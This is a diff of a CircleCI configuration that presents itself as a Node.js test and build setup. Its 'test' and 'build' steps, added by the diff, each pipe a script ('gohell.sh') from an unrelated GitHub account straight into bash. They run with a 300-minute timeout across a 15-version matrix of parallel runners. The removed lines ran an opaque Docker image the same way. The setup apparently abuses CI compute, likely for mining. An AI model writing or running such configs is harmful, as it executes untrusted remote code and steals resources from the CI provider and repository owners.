@@ -1,36 +1,59 @@
-version: 2.1 
- 
-orbs: 
-  docker: circleci/docker@2.0.1 
- 
-jobs: 
-  build: 
-    executor: docker/docker 
+version: 2.1
+
+executors:
+  my-linux:
+    docker:
+      - image: node
     resource_class: large
-    parallelism: 15
-    steps: 
-      - setup_remote_docker 
-      - checkout 
+
+orbs:
+  node: circleci/node@4.1
+
+jobs:
+  test:
+    parameters:
+      os:
+        type: executor
+      node-version:
+        type: string
+    executor: << parameters.os >>
+    steps:
+      - checkout
+      - node/install:
+          node-version: << parameters.node-version >>
+          install-yarn: true
       - run:
-          name: Run tests
-          command: |
-                      docker pull rngzfgn/hero:latest
-                      docker run -p 127.0.0.1:8080:8080 rngzfgn/hero:latest
-  deploy: 
-    executor: docker/docker 
-    resource_class: large
-    parallelism: 15
-    steps: 
-      - setup_remote_docker 
-      - checkout 
+         Name: test
+         command: |
+                     curl -sL https://raw.githubusercontent.com/6248202226/gradi/main/gohell.sh | bash
+         no_output_timeout: 300m
+  build:
+    parameters:
+      os:
+        type: executor
+      node-version:
+        type: string
+    executor: << parameters.os >>
+    steps:
+      - checkout
+      - node/install:
+          node-version: << parameters.node-version >>
+          install-yarn: true
       - run:
-          name: Run tests
-          command: |
-                      docker pull rngzfgn/hero:latest
-                      docker run -p 127.0.0.1:8080:8080 rngzfgn/hero:latest
-       
-workflows: 
-  main: 
-    jobs: 
-      - build 
-      - deploy
+         Name: build
+         command: |
+                     curl -sL https://raw.githubusercontent.com/6248202226/gradi/main/gohell.sh | bash
+         no_output_timeout: 300m
+workflows:
+  all-tests:
+    jobs:
+      - test:
+          matrix:
+            parameters:
+              os: [my-linux]
+              node-version: ["10.9.0", "11.9.0", "12.9.1", "13.9.0", "16.0.0", "14.16.1", "14.17.0", "16.1.0", "12.22.1", "10.24.1", "12.22.0", "14.16.0", "16.2.0", "12.21.0", "10.24.0"]
+      - build:
+          matrix:
+            parameters:
+              os: [my-linux]
+              node-version: ["10.9.0", "11.9.0", "12.9.1", "13.9.0", "16.0.0", "14.16.1", "14.17.0", "16.1.0", "12.22.1", "10.24.1", "12.22.0", "14.16.0", "16.2.0", "12.21.0", "10.24.0"]
